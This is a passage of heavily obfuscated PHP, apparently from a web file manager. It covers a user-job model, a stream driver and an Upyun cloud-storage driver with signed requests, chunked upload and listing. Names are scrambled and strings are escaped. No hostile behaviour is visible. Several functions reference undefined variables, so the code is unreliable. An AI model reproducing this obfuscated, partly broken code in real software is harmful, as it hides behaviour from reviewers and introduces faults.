$this->field($¢Âğ¦Ëà[32])->where($ºÙ«Á›)->select(); $ò é¸å† = array_to_keyvalue($ò é¸å†, $¢Âğ¦Ëà[12], $¢Âğ¦Ëà[32]); if (!$ò é¸å† || !in_array($¢ÍÉõÂø, $ò é¸å†)) { return $¢ÍÉõÂø; } for ($¢éßŒ™ö = 0; $¢éßŒ™ö < count($ò é¸å†); $¢éßŒ™ö++) { if (!in_array($¢ÍÉõÂø . "\50{$¢éßŒ™ö}\51", $ò é¸å†)) { return $¢ÍÉõÂø . "\50{$¢éßŒ™ö}\x29"; } } return $¢ÍÉõÂø . "\50{$¢éßŒ™ö}\51"; } } class UserJobModel extends ModelBaseLight { public $optionType = "\x53\171\163\164\145\x6d\56\152\x6f\x62\114\151\163\x74"; public $field = array("\156\141\x6d\x65", "\144\x65\163\x63", "\163\x6f\162\164"); const JOB_KEY = "\x73\145\154\x66\x4a\x6f\142\x4c\151\163\x74"; public function listData($£éÉ€¨‘ = false, $±Øì…§§ = "\x73\x6f\162\164", $³­”½«µ = false) { return parent::listData($£éÉ€¨‘, $±Øì…§§, $³­”½«µ); } public function remove($©Á’›¼™) { return parent::remove($©Á’›¼™); } public function add($¡¢¡õè) { $‹œ–óËÏ =& $_SERVER[ÅÄÇĞô]; if ($this->findByName($¡¢¡õè[$‹œ–óËÏ[32]])) { return !1; } $¡¢¡õè[$‹œ–óËÏ[2022]] = $this->getSort(); return parent::insert($¡¢¡õè); } private function getSort() { $Şû¼ßıö =& $_SERVER[ÅÄÇĞô]; $†Ë¸êÜ‡ = parent::listData(); $­ºÇÊ½‚ = array_to_keyvalue($†Ë¸êÜ‡, $Şû¼ßıö[12], $Şû¼ßıö[2022]); return empty($­ºÇÊ½‚) ? 0 : max($­ºÇÊ½‚) + 1; } public function update($´í†ú‡, $Ï‘µÑ˜) { $İ†ÆœÀ =& $_SERVER[ÅÄÇĞô]; $Ó†“Ã´ = parent::listData($´í†ú‡); $©ßé¡Ëò = $this->findByName($Ï‘µÑ˜[$İ†ÆœÀ[32]]); if (!$Ó†“Ã´ || $©ßé¡Ëò && $©ßé¡Ëò[$İ†ÆœÀ[478]] != $Ó†“Ã´[$İ†ÆœÀ[478]]) { return !1; } return parent::update($´í†ú‡, $Ï‘µÑ˜); } public function setUserJob($ˆúËÆó, $ÛÅäƒç) { $À‰²Š¼ñ =& $_SERVER[ÅÄÇĞô]; if (!is_array($ÛÅäƒç)) { $ÛÅäƒç = array($ÛÅäƒç); } $ÚÙÃìæ© = parent::listData(); $®¹»µ·ø = array_to_keyvalue($ÚÙÃìæ©, $À‰²Š¼ñ[32]); $†“Û¨‚… = $À‰²Š¼ñ[457]; foreach ($ÛÅäƒç as $¹ÚŸ•îÉ) { if ($®¹»µ·ø[$¹ÚŸ•îÉ]) { $†“Û¨‚… .= $®¹»µ·ø[$¹ÚŸ•îÉ][$À‰²Š¼ñ[478]] . $À‰²Š¼ñ[50]; } else { $ç“Äƒ²” = $this->add($¹ÚŸ•îÉ); $†“Û¨‚… .= $ç“Äƒ²” . $À‰²Š¼ñ[50]; } } $†“Û¨‚… = rtrim($†“Û¨‚…, $À‰²Š¼ñ[50]); Model($À‰²Š¼ñ[602])->metaSet($ˆúËÆó, self::JOB_KEY, $†“Û¨‚…); } public function getUserJob($áĞí¬ûÏ) { $—ØÆ®¤ö = Model($_SERVER[ÅÄÇĞô][602])->metaGet($áĞí¬ûÏ); return $this->getUserJobInfo($—ØÆ®¤ö[self::JOB_KEY]); } public function getUserJobInfo($—Î®ó©) { $ıæûõ¦» =& $_SERVER[ÅÄÇĞô]; $´İ¦ıã‘ = explode($ıæûõ¦»[50], $—Î®ó©); $ü¬±Ò‹ = parent::listData(); $ü¬±Ò‹ = array_remove_key($ü¬±Ò‹, $ıæûõ¦»[234]); $¥Ë¾ıü = array(); foreach ($´İ¦ıã‘ as $‹ÉşÎ§Ÿ) { if (isset($ü¬±Ò‹[$‹ÉşÎ§Ÿ])) { $¥Ë¾ıü[] = $ü¬±Ò‹[$‹ÉşÎ§Ÿ]; } } return $¥Ë¾ıü; } } goto e¼–Ÿ—ë¡©; eø³òïæ: class PathDriverStream extends PathDriverBase { const TYPE_STRING = 1; const TYPE_FILE = 2; public function __construct($Àã§¬„Ë, $Â³²û‹¹ = 0) { parent::__construct(); $this->source = $Àã§¬„Ë; $this->sourceSize = $Â³²û‹¹; if (is_string($this->source)) { $this->sourceType = self::TYPE_STRING; $this->sourceSize = strlen($this->source); } else { $this->sourceType = self::TYPE_FILE; } } public function size($Ş“ÎÀÒ = false) { return $this->sourceSize; } public function getContent($‚ø‰ÃÄ = false) { return $this->fileSubstr($‚ø‰ÃÄ, 0, $this->sourceSize); } public function fileSubstr($«¤âÏ®§ = false, $ëƒÒ–‰ = 0, $˜öÄ„ˆ = 0) { if (!$˜öÄ„ˆ) { $˜öÄ„ˆ = $this->sourceSize; } $•ûŞøù¢ = $this->sourceSize - $ëƒÒ–‰; if ($˜öÄ„ˆ >= $•ûŞøù¢) { $˜öÄ„ˆ = $•ûŞøù¢; } if ($this->sourceType == self::TYPE_STRING) { return substr($this->source, $ëƒÒ–‰, $˜öÄ„ˆ); } if ($this->sourceType == self::TYPE_FILE) { if ($˜öÄ„ˆ <= 0) { return $_SERVER[ÅÄÇĞô][12]; } $°æ·›–¶ = ftell($this->source); fseek_64($this->source, $°æ·›–¶ + $ëƒÒ–‰); $ğà»®ß± = @fread($this->source, $˜öÄ„ˆ); fseek_64($this->source, $°æ·›–¶); return $ğà»®ß±; } } public function hashMd5($ÚÈî¡½ = false) { return md5($this->getContent()); } public static function hash($´üÎ˜Î, $‹°¾ÖÅ² = 0) { $¿Ú°øºù = new PathDriverStream($´üÎ˜Î, $‹°¾ÖÅ²); return $¿Ú°øºù->hashSimple($´üÎ˜Î); } public static function md5($¥€é®ŒÏ, $øã§ªäã = 0) { $“¢çÛÇ = new PathDriverStream($¥€é®ŒÏ, $øã§ªäã); return $“¢çÛÇ->hashMd5($¥€é®ŒÏ); } } class PathDriverUSS extends PathDriverBase { protected $bucket = ''; protected $username = ''; protected $userpass = ''; protected $domain = ''; protected $token = ''; protected $endpoint = "\x68\164\x74\160\x3a\57\x2f\x76\60\x2e\x61\160\x69\56\x75\160\171\165\x6e\56\x63\x6f\155"; public $ioUploadServer = 0; public $ioFileOutServer = 0; public function __construct($Ÿ¹ëúªÎ) { parent::__construct(); $this->_init($Ÿ¹ëúªÎ); } public function _init($åÇİœœ±) { $ïõï«óß =& $_SERVER[ÅÄÇĞô]; foreach ($åÇİœœ± as $ªÕÆÚÆÀ => $Ô‡³ÒÒ) { if (isset($this->{$ªÕÆÚÆÀ})) { $this->{$ªÕÆÚÆÀ} = $Ô‡³ÒÒ; } } if (empty($this->username) || empty($this->userpass) || empty($this->domain)) { throw new Exception($ïõï«óß[1570] . LNG($ïõï«óß[1488])); } } public function setBucketCors() { return !0; } public function getBucketCors() { return !0; } public function isBucketCors() { return !0; } private function ussHeaders($¦ÁñèÊ£, $º¨Øæ‹Ñ = "\x47\105\124") { $¯”Æ…Š¸ =& $_SERVER[ÅÄÇĞô]; $³Æ‡Õ› = gmdate($¯”Æ…Š¸[1517]); $ÓÛòüÚ = base64_encode(hash_hmac($¯”Æ…Š¸[1571], "{$º¨Øæ‹Ñ}\x26{$¦ÁñèÊ£}\46{$³Æ‡Õ›}", md5("{$this->userpass}"), !0)); $ìâ½ÂıÒ = array("\x41\x75\164\150\x6f\162\151\172\141\164\x69\x6f\x6e\x3a\x55\120\131\x55\116\40{$this->username}\x3a{$ÓÛòüÚ}", "\104\x61\x74\x65\72{$³Æ‡Õ›}"); return $ìâ½ÂıÒ; } public function ussRequest($—è¯€Œ¿, $¢ñ†‡¸Ô = "\x47\x45\124", $ø€ÅĞÊÒ = false, $¯î”ï¯ƒ = false, $÷ÎŸËñÜ = false) { $Êš²®ã =& $_SERVER[ÅÄÇĞô]; $—è¯€Œ¿ = trim($—è¯€Œ¿, $Êš²®ã[8]); $Œ¾Ğ±çÏ = "\x2f{$this->bucket}\x2f" . rawurlencode($—è¯€Œ¿); $ùÎ¼“ë¨ = $this->ussHeaders($Œ¾Ğ±çÏ, $¢ñ†‡¸Ô); if ($¯î”ï¯ƒ) { $ùÎ¼“ë¨ = array_merge($ùÎ¼“ë¨, $¯î”ï¯ƒ); } $ã•ÅŒ•® = url_request($this->endpoint . $Œ¾Ğ±çÏ, $¢ñ†‡¸Ô, $ø€ÅĞÊÒ, $ùÎ¼“ë¨, $÷ÎŸËñÜ); if (!$ã•ÅŒ•®) { $æ±¥ƒ‡” = LNG($Êš²®ã[1572]); $this->writeLog($æ±¥ƒ‡”); return array($Êš²®ã[1320] => !1, $Êš²®ã[1310] => $æ±¥ƒ‡”); } if (strtolower($¢ñ†‡¸Ô) == $Êš²®ã[230] || in_array($ã•ÅŒ•®[$Êš²®ã[1320]], array($Êš²®ã[264], $Êš²®ã[1573]))) { $ø€ÅĞÊÒ = $ã•ÅŒ•®[$Êš²®ã[1574]]; if (!$ã•ÅŒ•®[$Êš²®ã[845]]) { $ø€ÅĞÊÒ = isset($ø€ÅĞÊÒ[0]) ? $ø€ÅĞÊÒ[0] : $Êš²®ã[12]; } } else { $ø€ÅĞÊÒ = json_decode($ã•ÅŒ•®[$Êš²®ã[1310]], !0); if (!$ø€ÅĞÊÒ) { $ø€ÅĞÊÒ = $ã•ÅŒ•®[$Êš²®ã[1310]]; } else { if (!$ã•ÅŒ•®[$Êš²®ã[845]] && isset($ø€ÅĞÊÒ[$Êš²®ã[1575]])) { $ø€ÅĞÊÒ = $ø€ÅĞÊÒ[$Êš²®ã[1575]]; } } } if (!$ã•ÅŒ•®[$Êš²®ã[845]]) { $this->writeLog($this->__errorMessage($ø€ÅĞÊÒ)); } return array($Êš²®ã[1320] => $ã•ÅŒ•®[$Êš²®ã[845]], $Êš²®ã[1310] => $ø€ÅĞÊÒ); } private function __errorMessage($¶şœÃ«É) { $û¿î×ŸÒ =& $_SERVER[ÅÄÇĞô]; if (!$¶şœÃ«É) { return $û¿î×ŸÒ[12]; } static $çü ¡™¢ = null; if (!$çü ¡™¢) { $çü ¡™¢ = I18n::getType(); } if ($çü ¡™¢ != $û¿î×ŸÒ[1527]) { return $¶şœÃ«É; } $¢“Ù‡¶ = array($û¿î×ŸÒ[1576] => $û¿î×ŸÒ[1577], $û¿î×ŸÒ[1578] => $û¿î×ŸÒ[1579], $û¿î×ŸÒ[1580] => $û¿î×ŸÒ[1579], $û¿î×ŸÒ[1581] => $û¿î×ŸÒ[1582], $û¿î×ŸÒ[1583] => $û¿î×ŸÒ[1584], $û¿î×ŸÒ[1585] => $û¿î×ŸÒ[1586], $û¿î×ŸÒ[1587] => $û¿î×ŸÒ[1588]); return isset($¢“Ù‡¶[$¶şœÃ«É]) ? $¢“Ù‡¶[$¶şœÃ«É] : $¶şœÃ«É; } public function mkfile($¦…¿è•Ã, $æÂèÒü§ = '', $ĞúÉÅ± = REPEAT_RENAME) { if ($this->setContent($¦…¿è•Ã, $æÂèÒü§)) { return $this->getPathOuter($¦…¿è•Ã); } return !1; } public function mkdir($ÏÃà‰Òé, $ÛŒİõ¸Ã = REPEAT_SKIP) { $şÉü¦¬ =& $_SERVER[ÅÄÇĞô]; $¦­ƒÕãí = trim($ÏÃà‰Òé, $şÉü¦¬[8]); if ($this->_isFolder($¦­ƒÕãí)) { return $this->getPathOuter($¦­ƒÕãí); } $ê«ÌÕë = array($şÉü¦¬[1589]); $µ­€ñ¿ = $this->ussRequest($¦­ƒÕãí, $şÉü¦¬[291], !1, $ê«ÌÕë); return $µ­€ñ¿[$şÉü¦¬[1320]] ? $this->getPathOuter($¦­ƒÕãí) : !1; } public function copyFile($Ò¦ß¾Š£, $¹ù›ó‹ˆ) { $“Ëñáø† =& $_SERVER[ÅÄÇĞô]; $¬¬ÙæÆ· = array($“Ëñáø†[1590] . "\x2f{$this->bucket}\57{$Ò¦ß¾Š£}", $“Ëñáø†[1591]); $ğ‘„‰¨» = $this->ussRequest($¹ù›ó‹ˆ, $“Ëñáø†[256], !1, $¬¬ÙæÆ·); return $ğ‘„‰¨»[$“Ëñáø†[1320]] ? !0 : $this->getPathOuter($¹ù›ó‹ˆ); } public function moveFile($ö¹ßÑˆ, $ää•Ô¤Û) { $‚Ü…å˜Ÿ =& $_SERVER[ÅÄÇĞô]; $¾ŞÒÒùÌ = array($‚Ü…å˜Ÿ[1592] . "\x2f{$this->bucket}\57{$ö¹ßÑˆ}", $‚Ü…å˜Ÿ[1591]); $´éäŒ = $this->ussRequest($ää•Ô¤Û, $‚Ü…å˜Ÿ[256], !1, $¾ŞÒÒùÌ); return $´éäŒ[$‚Ü…å˜Ÿ[1320]] ? !0 : $this->getPathOuter($ää•Ô¤Û); } public function delFile($­øÌü€©) { $”»úÜìô =& $_SERVER[ÅÄÇĞô]; $ÏÏ¼¯ºĞ = $this->ussRequest($­øÌü€©, $”»úÜìô[1593]); return $ÏÏ¼¯ºĞ[$”»úÜìô[1320]] ? !0 : !1; } public function delFolder($İ…ìæˆ) { $œ‹¢òæù =& $_SERVER[ÅÄÇĞô]; if (!$this->exist($İ…ìæˆ)) { return !0; } $this->listItemCache = !1; $Ş‘úò¬« = $˜¼•˜¢ğ = array(); $this->fileList($İ…ìæˆ, $Ş‘úò¬«, $˜¼•˜¢ğ, !0); $this->listItemCache = !0; foreach ($˜¼•˜¢ğ as $â­€ùºú) { $üÓˆüƒ† = $this->ussRequest($â­€ùºú[$œ‹¢òæù[32]], $œ‹¢òæù[1593]); if (!$üÓˆüƒ†[$œ‹¢òæù[1320]]) { return !1; } } usort($Ş‘úò¬«, function ($š•³ãÔá, $Ñ“İ€âú) { $§¨€Í¦ç =& $_SERVER[ÅÄÇĞô]; return substr_count($Ñ“İ€âú, $§¨€Í¦ç[8]) - substr_count($š•³ãÔá, $§¨€Í¦ç[8]); }); foreach ($Ş‘úò¬« as $å€¶©§) { $üÓˆüƒ† = $this->ussRequest($å€¶©§, $œ‹¢òæù[1593]); if (!$üÓˆüƒ†[$œ‹¢òæù[1320]]) { return !1; } } $üÓˆüƒ† = $this->ussRequest($İ…ìæˆ, $œ‹¢òæù[1593]); return $üÓˆüƒ†[$œ‹¢òæù[1320]]; } public function rename($ë£¸“, $¾²»ì©„) { if ($this->isFile($ë£¸“)) { $¾²»ì©„ = get_path_father($ë£¸“) . $¾²»ì©„; return $this->moveFile($ë£¸“, $¾²»ì©„); } return $this->renameObject($ë£¸“, $¾²»ì©„); } public function fileInfo($¥Š§Ø‡ó, $¦ÕñŸˆË = false, $¬İàİĞ = array()) { $–ßƒƒ =& $_SERVER[ÅÄÇĞô]; $³ğä€Å« = array($–ßƒƒ[32] => $this->pathThis($¥Š§Ø‡ó), $–ßƒƒ[87] => $this->getPathOuter($–ßƒƒ[8] . $¥Š§Ø‡ó), $–ßƒƒ[33] => $–ßƒƒ[233], $–ßƒƒ[79] => isset($¬İàİĞ[$–ßƒƒ[79]]) ? $¬İàİĞ[$–ßƒƒ[79]] : 0, $–ßƒƒ[169] => $this->ext($¥Š§Ø‡ó)); if ($¦ÕñŸˆË) { return $³ğä€Å«; } $³ğä€Å«[$–ßƒƒ[234]] = $³ğä€Å«[$–ßƒƒ[88]] = 0; $³ğä€Å«[$–ßƒƒ[235]] = $³ğä€Å«[$–ßƒƒ[236]] = !0; if (empty($¬İàİĞ)) { $¬İàİĞ = $this->objectMeta($¥Š§Ø‡ó); if (!$¬İàİĞ) { return $³ğä€Å«; } } $³ğä€Å«[$–ßƒƒ[234]] = intval($¬İàİĞ[$–ßƒƒ[1594]]); $³ğä€Å«[$–ßƒƒ[88]] = intval($¬İàİĞ[$–ßƒƒ[1595]]); $³ğä€Å«[$–ßƒƒ[79]] = $¬İàİĞ[$–ßƒƒ[79]]; return $³ğä€Å«; } public function folderInfo($ïÄîëËú, $Ï¡’‘Ò« = false) { $Ùîƒßş =& $_SERVER[ÅÄÇĞô]; $ÌÅÚÚ•½ = array($Ùîƒßş[32] => $this->pathThis($ïÄîëËú), $Ùîƒßş[87] => $this->getPathOuter($Ùîƒßş[8] . $ïÄîëËú), $Ùîƒßş[33] => $Ùîƒßş[78]); if ($Ï¡’‘Ò«) { return $ÌÅÚÚ•½; } $ÌÅÚÚ•½[$Ùîƒßş[234]] = $ÌÅÚÚ•½[$Ùîƒßş[88]] = 0; $ÌÅÚÚ•½[$Ùîƒßş[235]] = $ÌÅÚÚ•½[$Ùîƒßş[236]] = !0; if (empty($µùÂ®¶±)) { $µùÂ®¶± = $this->objectMeta($ïÄîëËú); if (!$µùÂ®¶±) { return $ÌÅÚÚ•½; } } $ÌÅÚÚ•½[$Ùîƒßş[234]] = intval($µùÂ®¶±[$Ùîƒßş[1594]]); $ÌÅÚÚ•½[$Ùîƒßş[88]] = intval($µùÂ®¶±[$Ùîƒßş[1595]]); return $ÌÅÚÚ•½; } private function listObjs($´‰±È‡ô, $²­Üæ¹· = 0, $È‰ƒ¡çí = 1000) { $¬Ò‡å·ú =& $_SERVER[ÅÄÇĞô]; $·µ¦÷Çõ = array($¬Ò‡å·ú[1596], $¬Ò‡å·ú[1597] . $È‰ƒ¡çí); if ($²­Üæ¹·) { $·µ¦÷Çõ[] = $¬Ò‡å·ú[1598] . $²­Üæ¹·; } $Ò°õµ = $this->ussRequest($´‰±È‡ô, $¬Ò‡å·ú[1519], !1, $·µ¦÷Çõ); return !$Ò°õµ[$¬Ò‡å·ú[1320]] ? !1 : $Ò°õµ[$¬Ò‡å·ú[1310]]; } private function fileList($‹Äª€‰Û, &$‘¿ˆëÕÖ, &$Ÿë¸Ş¿, $ØÌ¤Á† = false) { $úê¾İÂß =& $_SERVER[ÅÄÇĞô]; $İˆ¦å¯¿ = $úê¾İÂß[12]; $³º·§Œì = 1000; $°ÛªÜœŞ = rtrim($‹Äª€‰Û, $úê¾İÂß[8]) . $úê¾İÂß[8]; while (!0) { check_abort(); $òÁ¨ĞÄê = $this->listObjs($‹Äª€‰Û, $İˆ¦å¯¿, $³º·§Œì); if (!$òÁ¨ĞÄê) { return !1; } $İˆ¦å¯¿ = isset($òÁ¨ĞÄê[$úê¾İÂß[1599]]) ? $òÁ¨ĞÄê[$úê¾İÂß[1599]] : $úê¾İÂß[12]; $û­‚úÆ = isset($òÁ¨ĞÄê[$úê¾İÂß[1600]]) ? $òÁ¨ĞÄê[$úê¾İÂß[1600]] : array(); foreach ($û­‚úÆ as $×¬’Äâ) { $¯ŒÚ§àô = $×¬’Äâ[$úê¾İÂß[33]] == $úê¾İÂß[78] ? !0 : !1; $ì¾˜¬¿à = ltrim($°ÛªÜœŞ . $×¬’Äâ[$úê¾İÂß[32]], $úê¾İÂß[8]) . ($¯ŒÚ§àô ? $úê¾İÂß[8] : $úê¾İÂß[12]); $¦ÜÇ÷Ë´ = array($úê¾İÂß[32] => $ì¾˜¬¿à, $úê¾İÂß[33] => $¯ŒÚ§àô ? $úê¾İÂß[78] : $úê¾İÂß[233], $úê¾İÂß[79] => $×¬’Äâ[$úê¾İÂß[415]], $úê¾İÂß[1595] => $×¬’Äâ[$úê¾İÂß[1601]]); $this->cacheMethodInfoSet($ì¾˜¬¿à, $¯ŒÚ§àô, $¦ÜÇ÷Ë´); if ($¯ŒÚ§àô) { $‘¿ˆëÕÖ[] = $ì¾˜¬¿à; if ($ØÌ¤Á†) { $this->fileList($ì¾˜¬¿à, $‘¿ˆëÕÖ, $Ÿë¸Ş¿, $ØÌ¤Á†); } continue; } $Ÿë¸Ş¿[] = $¦ÜÇ÷Ë´; } if (count($û­‚úÆ) < $³º·§Œì) { break; } } $this->cacheMethodInfoSet($‹Äª€‰Û, !0); } public function listPath($ÃòàÄ¬, $äàÙ†ó‡ = false) { $¶ëÑŸÏ‡ =& $_SERVER[ÅÄÇĞô]; $ª‚ëÀØó = $´¢ÙŞ½Ÿ = array(); $this->fileList($ÃòàÄ¬, $ª‚ëÀØó, $´¢ÙŞ½Ÿ); foreach ($ª‚ëÀØó as $à¶ıâš => $ìÁØÑ•İ) { $ª‚ëÀØó[$à¶ıâš] = $this->folderInfo($ìÁØÑ•İ, $äàÙ†ó‡); } foreach ($´¢ÙŞ½Ÿ as $à¶ıâš => $ìÁØÑ•İ) { $´¢ÙŞ½Ÿ[$à¶ıâš] = $this->fileInfo($ìÁØÑ•İ[$¶ëÑŸÏ‡[32]], $äàÙ†ó‡, $ìÁØÑ•İ); } return array($¶ëÑŸÏ‡[85] => $ª‚ëÀØó, $¶ëÑŸÏ‡[86] => $´¢ÙŞ½Ÿ); } public function has($øù»À¼Ÿ, $ÈÓıÇ¾ı = false, $¨ô°Ôë = true) { $ÏúÉ“ÏŒ =& $_SERVER[ÅÄÇĞô]; $û•ø×”¸ = $ÏúÉ“ÏŒ[12]; $Â¼¢÷µ = 500; $çñ‰ÈÚÆ = 0; $À“áº½„ = 0; $ôÂŸâè = rtrim($øù»À¼Ÿ, $ÏúÉ“ÏŒ[8]) . $ÏúÉ“ÏŒ[8]; while (!0) { check_abort(); $ÎèşÆ« = $this->listObjs($øù»À¼Ÿ, $û•ø×”¸, $Â¼¢÷µ); if (!$ÎèşÆ«) { return !1; } $û•ø×”¸ = isset($ÎèşÆ«[$ÏúÉ“ÏŒ[1599]]) ? $ÎèşÆ«[$ÏúÉ“ÏŒ[1599]] : $ÏúÉ“ÏŒ[12]; $§¦Ï¡µ = isset($ÎèşÆ«[$ÏúÉ“ÏŒ[1600]]) ? $ÎèşÆ«[$ÏúÉ“ÏŒ[1600]] : array(); if (empty($§¦Ï¡µ)) { break; } $ÅŞÕ·ÎÆ = array_filter($§¦Ï¡µ, function ($ëÛìÆ²¨) { $¥ˆ°Ôùá =& $_SERVER[ÅÄÇĞô]; return $ëÛìÆ²¨[$¥ˆ°Ôùá[33]] == $¥ˆ°Ôùá[78]; }); $“‚ËŸİà = count($§¦Ï¡µ); $ÅŞÕ·ÎÆ = count($ÅŞÕ·ÎÆ); $ˆÓ‰…„õ = $“‚ËŸİà - $ÅŞÕ·ÎÆ; if ($ÈÓıÇ¾ı) { $À“áº½„ += $ÅŞÕ·ÎÆ; $çñ‰ÈÚÆ += $ˆÓ‰…„õ; if ($“‚ËŸİà < $Â¼¢÷µ) { break; } continue; } if ($¨ô°Ôë) { if ($ˆÓ‰…„õ) { return !0; } } else { if ($ÅŞÕ·ÎÆ) { return !0; } } if ($“‚ËŸİà < $Â¼¢÷µ) { break; } } if ($ÈÓıÇ¾ı) { return array($ÏúÉ“ÏŒ[242] => $çñ‰ÈÚÆ, $ÏúÉ“ÏŒ[243] => $À“áº½„); } return !1; } public function listAll($–—ëëôü) { $ùŞù¹ =& $_SERVER[ÅÄÇĞô]; $¨úƒîÏ§ = $ÚÜéÄô = array(); $this->fileList($–—ëëôü, $¨úƒîÏ§, $ÚÜéÄô, !0); $óéˆŒæÜ = array_to_keyvalue($ÚÜéÄô, $ùŞù¹[32]); foreach ($¨úƒîÏ§ as $Å¨Ûğî¹) { if (is_string($Å¨Ûğî¹)) { $óéˆŒæÜ[$Å¨Ûğî¹] = array($ùŞù¹[79] => 0); } } return $this->listAllFiles($–—ëëôü, $óéˆŒæÜ); } public function canRead($ôĞ°”½­) { return $this->exist($ôĞ°”½­) ? !0 : !1; } public function canWrite($£“°Œõ‰) { return $this->exist($£“°Œõ‰) ? !0 : !1; } public function getContent($„¹òšáÉ) { return $this->fileSubstr($„¹òšáÉ, 0, -1); } public function setContent($æüÀÚùÆ, $·‚æÙ£± = '') { $¹‹½ £º =& $_SERVER[ÅÄÇĞô]; if (!$·‚æÙ£±) { $ÂëƒÅ¿ = $this->ussRequest($æüÀÚùÆ, $¹‹½ £º[291]); return $ÂëƒÅ¿[$¹‹½ £º[1320]]; } $ØÈì¤‰­ = $this->tempFile($this->pathThis($æüÀÚùÆ)); file_put_contents($ØÈì¤‰­, $·‚æÙ£±); if ($this->upload($æüÀÚùÆ, $ØÈì¤‰­)) { $this->tempFileRemve($ØÈì¤‰­); return !0; } return !1; } public function fileSubstr($§µà­®², $ïÅÖ™°, $–©Ë¬Š˜) { $Ÿ‰øİúš =& $_SERVER[ÅÄÇĞô]; if (!($ÒÕµ¸µ™ = $this->link($§µà­®²))) { return !1; } $ìËğ„›« = !1; if ($–©Ë¬Š˜ > 0) { $ç¯»²‡¥ = $ïÅÖ™° + $–©Ë¬Š˜ - 1; $ìËğ„›« = array($Ÿ‰øİúš[1560] . $ïÅÖ™° . $Ÿ‰øİúš[465] . $ç¯»²‡¥); } $¿õÂÌ¬» = url_request($ÒÕµ¸µ™, $Ÿ‰øİúš[1519], !1, $ìËğ„›«); return $¿õÂÌ¬»[$Ÿ‰øİúš[845]] ? $¿õÂÌ¬»[$Ÿ‰øİúš[1310]] : !1; } public function upload($´€Ù¶Öù, $¬½òØ¦ô, $’É£ıœì = false, $¯Ë²Èä = REPEAT_REPLACE) { $ĞÜ™›õ =& $_SERVER[ÅÄÇĞô]; $˜¦œœú = IO::size($¬½òØ¦ô); if ($˜¦œœú <= 1024 * 1024 * 200) { $İÓµæ¡ = array($ĞÜ™›õ[1602] . $¬½òØ¦ô); $üÏıÑ–ò = $this->ussRequest($´€Ù¶Öù, $ĞÜ™›õ[256], $İÓµæ¡); return $üÏıÑ–ò[$ĞÜ™›õ[1320]] ? $this->getPathOuter($´€Ù¶Öù) : !1; } $Şí‡’å¶ = 1024 * 1024 * 10; $á’Â›˜Š = array($ĞÜ™›õ[1603], $ĞÜ™›õ[1604] . $˜¦œœú, $ĞÜ™›õ[1605], $ĞÜ™›õ[1606] . $Şí‡’å¶); $üÏıÑ–ò = $this->ussRequest($´€Ù¶Öù, $ĞÜ™›õ[256], !1, $á’Â›˜Š); if (!$üÏıÑ–ò[$ĞÜ™›õ[1320]]) { return !1; } $ş†€°´‘ = $üÏıÑ–ò[$ĞÜ™›õ[1310]]; $¡±îÂê® = 0; $‹°•¬ñÆ = $ş†€°´‘[$ĞÜ™›õ[1607]]; $ì—ÃÈÈû = fopen($¬½òØ¦ô, $ĞÜ™›õ[1482]); if (!$ì—ÃÈÈû) { return !1; } do { $÷ãÒÊ´œ = $ş†€°´‘[$ĞÜ™›õ[1608]]; fseek_64($ì—ÃÈÈû, $¡±îÂê®); $Ï’­¶„Ğ = fread($ì—ÃÈÈû, $÷ãÒÊ´œ); $»êÈúòÄ = 0; do { $»êÈúòÄ++; $ş†€°´‘ = $this->uploadPart($´€Ù¶Öù, $ş†€°´‘, $Ï’­¶„Ğ); } while (!$ş†€°´‘ && $»êÈúòÄ < 3); if (!$ş†€°´‘) { return !1; } $‹°•¬ñÆ = $ş†€°´‘[$ĞÜ™›õ[1607]]; $¡±îÂê® += $÷ãÒÊ´œ; } while ($‹°•¬ñÆ != -1); fclose($ì—ÃÈÈû); $á’Â›˜Š = array($ĞÜ™›õ[1609], $ĞÜ™›õ[1610] . $ş†€°´‘[$ĞÜ™›õ[1611]], $ĞÜ™›õ[1605]); $üÏıÑ–ò = $this->ussRequest($´€Ù¶Öù, $ĞÜ™›õ[256], !1, $á’Â›˜Š); return $üÏıÑ–ò[$ĞÜ™›õ[1320]] ? $this->getPathOuter($‚¥ö™ÎË) : !1; } private function uploadPart($¼øâã‚, $¹ÊÀ°°„, &$êº—¾¶½) { $şÉá½·à =& $_SERVER[ÅÄÇĞô]; $ÙˆÕæè = array($şÉá½·à[1612], $şÉá½·à[1610] . $¹ÊÀ°°„[$şÉá½·à[1611]], $şÉá½·à[1613] . $¹ÊÀ°°„[$şÉá½·à[1607]], $şÉá½·à[146] . $¹ÊÀ°°„[$şÉá½·à[1608]]); $Ã¬—òÈ¥ = $this->ussRequest($¼øâã‚, $şÉá½·à[256], $êº—¾¶½, $ÙˆÕæè); return !$Ã¬—òÈ¥[$şÉá½·à[1320]] ? $Ã¬—òÈ¥[$şÉá½·à[1320]] : $Ã¬—òÈ¥[$şÉá½·à[1310]]; } public function uploadFormData($¤¤Ë±‰, $ñÊ˜ÄÏŒ = 3600) { return $this->uploadPolicy($¤¤Ë±‰, $ñÊ˜ÄÏŒ); } public function uploadMultiData($æ¹¿ú÷, $ÒÎ±«šä = 3600) { $“ãåÑº× =& $_SERVER[ÅÄÇĞô]; $ü’Ææ‹Ú = (int) $GLOBALS[$“ãåÑº×[7]][$“ãåÑº×[79]]; return $this->uploadPolicy($æ¹¿ú÷, $ÒÎ±«šä, $ü’Ææ‹Ú); } private function uploadPolicy($¿Ÿ•Å¨á, $¤Ôòš = 3600, $ÎÅ†Îõş = 0) { $§²Î‡ªÃ =& $_SERVER[ÅÄÇĞô]; $“ŠãŠ­ì = $§²Î‡ªÃ[8] . $this->bucket; $”§§¿¶î = gmdate($§²Î‡ªÃ[1517]); $®ÀæØñæ = array($§²Î‡ªÃ[1614] => $this->bucket, $§²Î‡ªÃ[1615] => $¿Ÿ•Å¨á, $§²Î‡ªÃ[1616] => time() + $¤Ôòš, $§²Î‡ªÃ[1617] => $”§§¿¶î); if ($ÎÅ†Îõş) { $®ÀæØñæ[$§²Î‡ªÃ[1502]] = $ÎÅ†Îõş; } $ŸŒ†§ü = base64_encode(json_encode($®ÀæØñæ)); $Âû‚ŒèØ = base64_encode(hash_hmac($§²Î‡ªÃ[1571], "\x50\117\123\x54\46{$“ŠãŠ­ì}\x26{$”§§¿¶î}\x26{$ŸŒ†§ü}", md5("{$this->userpass}"), !0)); $ÚÌğ²›´ = array($§²Î‡ªÃ[280] => $ŸŒ†§ü, $§²Î‡ªÃ[1618] => "\125\x50\x59\125\x4e\x20{$this->username}\72{$Âû‚ŒèØ}", $§²Î‡ªÃ[209] => $this->endpoint . $“ŠãŠ­ì); return $ÚÌğ²›´; } public function download($ü¡ƒÛÈÅ, 